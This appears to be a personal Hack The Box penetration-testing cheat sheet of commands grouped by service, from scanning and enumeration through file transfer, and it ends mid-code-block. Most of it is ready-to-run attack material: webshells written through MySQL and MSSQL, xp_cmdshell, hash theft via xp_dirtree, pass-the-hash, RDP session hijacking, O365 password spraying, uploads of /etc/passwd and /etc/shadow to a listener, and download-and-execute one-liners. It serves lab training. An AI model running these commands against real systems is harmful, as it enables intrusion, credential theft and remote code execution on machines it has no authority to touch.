# HTB – Penetration Testing Notes

Author: James Saltmer  
Purpose: Consolidated HTB pentesting notes with duplicated commands grouped by workflow.

---

## 0. Quick Scanning (Nmap)

### Full TCP scan (default scripts + version detection)
```bash
nmap -sC -sV -p- --min-rate 1000 10.129.106.147 > nmap1.txt
```

### Common UDP scan (curated ports)
```bash
nmap -sU -sV -sC -p U:53,67,68,69,123,161,162,514,1194,1434,1900 10.129.106.147 > nmap2.txt
```

---

## 1. Initial Setup & Utilities

### Add domain to `/etc/hosts`
```bash
sudo sh -c "echo '94.237.51.125 inlanefreight.htb' >> /etc/hosts"
```

### Create self-signed certificate (single PEM containing key+cert)
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Python – extract ZIP without `unzip`
```python
import zipfile

with zipfile.ZipFile('test.zip', "r") as z:
    z.extractall("/home/user/directory")
```

---

## 2. Passive Recon / OSINT

- `crt.sh` / `search.censys.io` → SSL Certificates log  
- `Domain.Glass` → Infrastructure  
- `buckets.grayhatwarfare.com` → Cloud buckets  
- `web.archive.org` → Web archives  
- `github.com/EdOverflow/can-i-take-over-xyz` → Domain Takeover Repo
### crt.sh JSON
```bash
curl -s "https://crt.sh/?q=foo.com&output=json" | jq .
```

### crt.sh → extract unique names
```bash
curl -s "https://crt.sh/?q=foo.com&output=json" \
| jq . \
| grep name \
| cut -d":" -f2 \
| grep -v "CN=" \
| cut -d'"' -f2 \
| awk '{gsub(/\\n/,"\n");}1;' \
| sort -u
```

### Resolve subdomains → IPs
```bash
for i in $(cat subdomainlist); do
  host "$i" | grep "has address" | grep foo.com | cut -d" " -f1,4
done
```

### Save IPs to file
```bash
for i in $(cat subdomainlist); do
  host "$i" | grep "has address" | grep foo.com | cut -d" " -f4 >> ip-addresses.txt
done
```

### Shodan lookup for each IP
```bash
for i in $(cat ip-addresses.txt); do
  shodan host "$i"
done
```

### DNS quick checks
```bash
dig any foo.com
```

### Google “dorks” for cloud artifacts
- AWS: `intext:foo inurl:amazonaws.com`
- Azure: `intext:foo inurl:blob.core.windows.net`

---

## 3. Google Operators Cheat Sheet

| Operator | Description | Example | Example Description |
|---|---|---|---|
| `site:` | Limits results to a site/domain | `site:example.com` | All publicly accessible pages on example.com |
| `inurl:` | Term in the URL | `inurl:login` | Search for login pages |
| `filetype:` | File type search | `filetype:pdf` | Find PDFs |
| `intitle:` | Term in title | `intitle:"confidential report"` | Find pages with that title |
| `intext:` / `inbody:` | Term in body text | `intext:"password reset"` | Pages containing phrase |
| `cache:` | Cached version | `cache:example.com` | View cached content |
| `link:` | Pages linking to URL | `link:example.com` | Find backlinks |
| `related:` | Similar sites | `related:example.com` | Similar websites |
| `info:` | Summary info | `info:example.com` | Basic details |
| `define:` | Definitions | `define:phishing` | Definitions |
| `numrange:` | Numbers in range | `site:example.com numrange:1000-2000` | Pages containing numbers 1000–2000 |
| `allintext:` | All words in body | `allintext:admin password reset` | Both terms in body |
| `allinurl:` | All words in URL | `allinurl:admin panel` | Both terms in URL |
| `allintitle:` | All words in title | `allintitle:confidential report 2023` | Words in title |
| `AND` | Requires all terms | `site:example.com AND (inurl:admin OR inurl:login)` | Narrow results |
| `OR` | Any of terms | `"linux" OR "ubuntu" OR "debian"` | Broader search |
| `NOT` | Exclude terms | `site:bank.com NOT inurl:login` | Exclude login pages |
| `*` | Wildcard | `site:socialnetwork.com filetype:pdf user* manual` | user guide/handbook/manual |
| `..` | Numeric range | `site:ecommerce.com "price" 100..500` | Price 100–500 |
| `""` | Exact phrase | `"information security policy"` | Exact phrase |
| `-` | Exclude terms | `site:news.com -inurl:sports` | Exclude sports |

### Common Google Dorks

**Finding login pages**
```text
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
```

**Exposed files**
```text
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)
```

**Config files**
```text
site:example.com inurl:config.php
site:example.com (ext:conf OR ext:cnf)
```

**Backups / DB dumps**
```text
site:example.com inurl:backup
site:example.com filetype:sql
```

---

## 4. FTP

### Config / access control
```bash
cat /etc/vsftpd.conf | grep -v "#"
cat /etc/ftpusers
```

### FTP client
```bash
ftp username:password@my.domain.com
```
Common commands:
```text
status
ls
ls -R
get foo.txt
put foo.txt
```

### Mirror download (anonymous)
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

### Raw interaction
```bash
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21
```

### FTP over TLS
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

---

## 5. SMB / Samba

### Config
```bash
cat /etc/samba/smb.conf | grep -v "#\|\;"
```

### Enumerate shares / connect
```bash
# Display a list of shares
smbclient -N -L //10.129.14.128
# Or:
smbmap -H 10.129.14.128

# List contents of directory
smbclient //10.129.14.128/foo
# Or:
smbmap -H 10.129.14.128 -r notes
```

### Donwload files
```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

### Upload Files
```bash
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Linux - Mount
```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

# Search for files with a name conataining cred
find /mnt/Finance/ -name *cred*

# Search for files with a name conataining cred
grep -rn /mnt/Finance/ -ie cred
```
SMB client commands:
```text
help
ls
get foo.txt
```

For Windows CMD:
```bat
rem List files/folders in a share
dir \\192.168.220.129\Finance\

rem Connect to a shared resource
net use n: \\192.168.220.129\Finance

rem Count how many files are in a share
dir n: /a-d /s /b | find /c ":\"

rem Search for files with a name conataining cred
dir n:\*cred* /s /b

rem Search for fles containing a specific word
findstr /s /i cred n:\*.*
```

For Windows Powershell:
```powershell
# List files/folders in a share
Get-ChildItem \\192.168.220.129\Finance\

# Connect to a share
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

# Authenticate and connect to a share
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

 # Count how many files are in a share
(Get-ChildItem -File -Recurse | Measure-Object).Count

# Search for files with a name conataining cred
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

# Search for fles containing a specific word
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```
### Service footprinting
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

### rpcclient enumeration
```bash
rpcclient -U "" 10.129.14.128
```

Common rpcclient commands:
```text
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo foo
enumdomusers
queryuser <RID>
```

### RID bruteforce loop
```bash
for i in $(seq 500 1100); do
  rpcclient -N -U "" 10.129.14.128 \
    -c "queryuser 0x$(printf '%x\n' $i)" \
  | grep "User Name\|user_rid\|group_rid" && echo ""
done
```

### Tools
```bash
impacket-psexec administrator:'Password123!'@10.10.110.17

samrdump.py 10.129.14.128

smbmap -H 10.129.14.128

crackmapexec smb 10.129.14.128 --shares -u '' -p '' # Use --local-auth for non-domain joined computer

# For RCE
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec 

./enum4linux-ng.py 10.129.14.128 -A

# Capture hashes from name resolution fails. Stored in /usr/share/responder/logs/
responder -I <interface name>
```

---

## 6. NFS

### Footprinting
```bash
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

### List exports
```bash
showmount -e 10.129.14.128
```

### Mount share
```bash
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

### Listing with names vs IDs
```bash
ls -l mnt/nfs/
ls -n mnt/nfs/
```

---

## 7. DNS

### Record types (high-level)
- **A** → IPv4 address  
- **AAAA** → IPv6 address  
- **MX** → mail servers  
- **NS** → nameservers  
- **TXT** → arbitrary text (SPF/DMARC/verification)  
- **CNAME** → alias to another name  
- **PTR** → reverse (IP → name)  
- **SOA** → zone authority + admin contact  

### Footprinting / common commands
```bash
dig ns inlanefreight.htb @10.129.14.128
dig CH TXT version.bind 10.129.120.85
dig any inlanefreight.htb @10.129.14.128
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128
```

### `dig` quick reference
```bash
dig domain.com
dig domain.com A
dig domain.com AAAA
dig domain.com MX
dig domain.com NS
dig domain.com TXT
dig domain.com CNAME
dig domain.com SOA
dig @1.1.1.1 domain.com
dig +trace domain.com
dig -x 192.168.1.1
dig +short domain.com
dig +noall +answer domain.com
dig domain.com ANY
```

### Subdomain brute forcing (wordlist + `dig`)
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig "$sub.inlanefreight.htb" @10.129.14.128 \
  | grep -v ';\|SOA' \
  | sed -r '/^\s*$/d' \
  | grep "$sub" \
  | tee -a subdomains.txt
done
```

### Subdomain Enumeration
```bash
./subfinder -d inlanefreight.com -v   
```

### dnsenum brute forcing
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 \
  -o subdomains.txt \
  -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  inlanefreight.htb

dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

### Sub Domain bruteforcing with self defined resolvers
```bash
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

### Scan For DNS Zone Transfers with Fierce
```bash
fierce --domain zonetransfer.me
```
### DNS tools list
- dig
- nslookup
- host
- dnsenum
- fierce
- dnsrecon
- theHarvester
- subfinder
-  subbrute

---

## 8. SMTP

### Config
```bash
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

### SMTP commands (overview)
- `AUTH PLAIN` → authenticate client
- `HELO` → introduce client hostname
- `MAIL FROM` → sender
- `RCPT TO` → recipient
- `DATA` → message body
- `RSET` → reset transaction
- `VRFY` → verify mailbox
- `EXPN` → expand mailing list
- `NOOP` → keepalive
- `QUIT` → end session

### Interact
```bash
telnet 10.129.14.128 25
```

### Through a web proxy
```text
CONNECT 10.129.14.128:25 HTTP/1.0
```

### Open relay risk example
```text
mynetworks = 0.0.0.0/0
```

### Footprinting
```bash
sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

### User enumeration
```bash
wget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip
unzip Footprinting-wordlist.zip

smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -D inlanefreight.htb -t 10.129.181.79 -m 60 -w 20
```

---

## 9. IMAP / POP3

### IMAP commands
```text
1 LOGIN username password
1 LIST "" *
1 CREATE "INBOX"
1 DELETE "INBOX"
1 RENAME "ToRead" "Important"
1 LSUB "" *
1 SELECT INBOX
1 UNSELECT INBOX
1 FETCH <ID> all
1 FETCH 1 (Body[])
1 CLOSE
1 LOGOUT
```

### POP3 commands
```text
USER username
PASS password
STAT
LIST
RETR id
DELE id
CAPA
RSET
QUIT
```

### “Dangerous” Dovecot-ish settings
- `auth_debug`
- `auth_debug_passwords`
- `auth_verbose`
- `auth_verbose_passwords`
- `auth_anonymous_username`

### Footprinting
```bash
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

### Auth / banners with curl
```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

### OpenSSL interaction
```bash
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

### O365 Spray for Target Domains using Office 365
Check if domain is using O365
```bash
python3 o365spray.py --validate --domain msplaintext.xyz
```

Enumerate Usernames
```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz 
```
Password Spraying
```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
---



## 10. SNMP

### Config
```bash
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

### Dangerous settings
- `rwuser noauth`
- `rwcommunity <community> <IPv4>`
- `rwcommunity6 <community> <IPv6>`

### Walk
```bash
snmpwalk -v2c -c public 10.129.14.128
```

### Community bruteforce
```bash
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

### braa
```bash
sudo apt install braa
braa public@10.129.14.128:.1.3.6.*
```

---

## 11. MySQL

### Config
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

### Dangerous settings
- `user`
- `password`
- `admin_address`
- `debug`
- `sql_warnings`
- `secure_file_priv`

### Enumeration
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

### Client interaction
```bash
mysql -u <user> -h 10.129.14.132
mysql -u <user> -p<password> -h 10.129.14.128
```

### Write to Local File
```sql
-- PHP Webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### Read Local File
```sql
select LOAD_FILE("/etc/passwd");
```

### MySQL quick commands
```sql
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";
```

---

## 12. MSSQL

### Nmap enumeration (example)
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
  -sV -p 1433 10.129.201.248
```

### Metasploit mssql_ping
```text
msf6 > use auxiliary(scanner/mssql/mssql_ping)
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

### Connect with Impacket
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### Connect with SQSH
Linux Bash
```bash
sqsh -S 10.129.20.13 -U username -P Password123
```

### Connect with SQLCMD
Windows Cmd
```bat
sqlcmd -S 10.129.20.13 -U username -P Password123
```

### xp_cmdshell

Execute command
```sql
1> xp_cmdshell 'whoami'
2> GO
```

Enable xp_cmdshell
```sql
EXECUTE sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO 

EXECUTE sp_configure 'xp_cmdshell', 1
GO

RECONFIGURE
GO
```

### Write to Files

Enable Ole Automation Procedures
```sql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Create a File
```sql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files
```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### Capture MSSQL Service Hash
Start Respondor Or Impacket-smbserver
```bash
# Responder
sudo responder -I tun0

# Or impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```
XP_DIRTREE Hash Stealing
```sql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

XP_SUBDIRS Hash Stealing
```sql
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### Impersonating Other Users
Identify Users to Impersonate
```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Verifying our Current User and Role
```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Impersonating User (sa)
```sql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### Communicate with Other Databases with MSSQL
Identify linked Servers in MSSQL
```sql
1> SELECT srvname, isremote FROM sysservers
2> GO
```

Identify User and Privileges used for connection
```sql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```
---

## 13. Oracle TNS

### Key config files
```text
$ORACLE_HOME/network/admin/tnsnames.ora
$ORACLE_HOME/network/admin/listener.ora
```

### Install instantclient + ODAT (example sequence)
```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc

cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

### ODAT help
```bash
./odat.py -h
```

### Enumerate / brute SID
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
./odat.py all -s 10.129.204.235
```

### Connect
```bash
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

### Extract hashes (sysdba)
```sql
select name, password from sys.user$;
```

### File upload test (UTL_FILE)
```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```

### Fix `libsqlplus.so` error
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

---

## 14. IPMI

### Nmap
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit version scan
```text
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
```

### Default passwords
| Product | Username | Password |
|---|---|---|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-char (numbers + uppercase) |
| Supermicro IPMI | ADMIN | ADMIN |

### Crack hashes (hashcat mask example)
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### Dump hashes (Metasploit)
```text
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
```

---

## 15. SSH / R-Services / RDP / WinRM

### “Dangerous” SSH settings
- `PasswordAuthentication yes`
- `PermitEmptyPasswords yes`
- `PermitRootLogin yes`
- `Protocol 1`
- `X11Forwarding yes`
- `AllowTcpForwarding yes`
- `PermitTunnel`
- `DebianBanner yes`

### ssh-audit
```bash
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py 10.129.14.132
```

### SSH usage
```bash
ssh -v cry0l1t3@10.129.14.132
ssh -i private.key <user>@<FQDN/IP>
# To fix bad permissions
chmod 600 id_rsa
```

### rsync footprinting
```bash
sudo nmap -sV -p 873 127.0.0.1
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
```

### Trusted hosts
```bash
cat /etc/hosts.equiv
```

### R-services
```bash
sudo nmap -sV -p 512,513,514 10.0.17.2
rlogin 10.0.17.2 -l htb-student
rwho
rusers -al 10.0.17.5
```

### RDP footprinting + tools
```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
sudo cpan
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

### RDP connect
```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```

### RDP Pass the Hash (PtH)
Adding the DisableRestrictedAdmin Registry Key
```bat
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

PtH with xfreerdp
```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### RDP Session Hijacking
Find Active User Sessions
```bash
query user
```
With System privileges
```bat
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

With Local Administrator Privileges
```bat
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

net start sessionhijack
```
### WinRM footprinting + connect
```bash
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

---

## 16. Web Enumeration

### WHOIS
```bash
whois inlanefreight.com
```

### Virtual host discovery
```bash
gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
gobuster vhost -u http://inlanefreight.htb:80 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Banner grabbing
```bash
curl -I https://inlanefreight.com
```

### Detect WAF
```bash
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f inlanefreight.com
```

### Nikto
```bash
sudo apt update && sudo apt install -y perl
git clone https://github.com/sullo/nikto
cd nikto/program
chmod +x ./nikto.pl
nikto -h inlanefreight.com -Tuning b
```

### CMS discovery
```bash
curl -s http://app.inlanefreight.local/index.php | grep '<meta name="generator"'
```

### Well-known URIs (examples)
| URI | Description | Status | Reference |
|---|---|---:|---|
| `security.txt` | Contact info for vuln reports | Permanent | RFC 9116 |
| `/.well-known/change-password` | Standard change-password URL | Provisional | W3C draft |
| `openid-configuration` | OIDC discovery endpoint | Permanent | OpenID spec |
| `assetlinks.json` | Digital Asset Links ownership | Permanent | Google DAL |
| `mta-sts.txt` | SMTP MTA-STS policy | Permanent | RFC 8461 |

### ReconSpider
```bash
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```

ReconSpider JSON output keys:
- `emails`, `links`, `external_files`, `js_files`, `form_fields`, `images`, `videos`, `audio`, `comments`

### FinalRecon
```bash
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
pip3 install -r requirements.txt
chmod +x ./finalrecon.py
./finalrecon.py --help
./finalrecon.py --headers --whois --url http://inlanefreight.com
```

FinalRecon options (summary):
- `--headers`, `--sslinfo`, `--whois`, `--crawl`, `--dns`, `--sub`, `--dir`, `--wayback`, `--ps`, `--full`

---

## 17. Hashing / Base64 / File transfer

### Linux
```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
echo -n '...' | base64 -d > id_rsa
```

### Windows
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("..."))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### PowerShell downloads
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
Invoke-WebRequest <url> -OutFile <file>
curl.exe --output index.html --url https://superuser.com
```

### SMB server (Impacket)
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Windows copy from SMB:
```text
copy \\192.168.220.133\share\nc.exe
```

### FTP server (pyftpdlib)
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

PowerShell FTP download:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Windows built-in `ftp.exe` with script file
```text
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### uploadserver (Python HTTP upload)
```bash
pip3 install uploadserver
python3 -m uploadserver
```

PowerShell upload script (PSUpload):
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

PowerShell base64 upload:
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### Raw TCP HTTP (Linux)
```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

### SSH server enable/start
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

### SCP
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### HTTPS uploadserver with self-signed cert
```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload multiple files:
```bash
curl -X POST https://192.168.49.128/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

### Quick servers
```bash
python3 -m http.server
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

### Python download one-liner
```python
import urllib.request as request
request.urlretrieve("http://STMIP/flag.txt", "flag.txt")
```

### Download with Python 2/3, PHP, Ruby, Perl, JS, VBScript (one-liners)

Python 2:
```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'
```

Python 3:
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'
```

PHP (save file):
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

PHP (stream):
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","rb"); $flocal = fopen("LinEnum.sh","wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP (pipe to bash):
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Ruby:
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

Perl:
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

JScript (wget.js):
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Run JScript:
```text
cscript.exe /nologo wget.js <url> <outfile>
```

VBScript (wget.vbs):
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Run VBScript:
```text
cscript.exe /nologo wget.vbs <url> <outfile>
```

### Upload with Python requests one-liner
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Netcat file transfer patterns
Listener → file:
```bash
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Send file:
```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Common “443” transfer patterns:
```bash
